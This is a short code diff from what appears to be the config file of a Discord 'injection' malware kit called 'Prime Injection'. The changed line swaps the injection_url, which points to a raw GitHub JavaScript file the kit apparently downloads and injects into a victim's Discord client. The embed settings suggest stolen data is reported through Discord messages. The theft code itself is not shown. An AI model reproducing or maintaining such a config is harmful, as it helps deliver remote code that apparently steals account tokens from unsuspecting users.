@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Prime Injection',
   embed_icon: 'https://media.discordapp.net/attachments/1145210470077317140/1221582729536213024/prim.jpg?ex=66131a92&is=6600a592&hm=1400ec7582dd009120767d3608ecf2046417aff6f19edf28ad85b7f0317c9d66&=&format=webp&width=192&height=192'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/SheLuvDx/index/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/SheLuvDx/injection/main/index.js', 
   /**
    
    **/
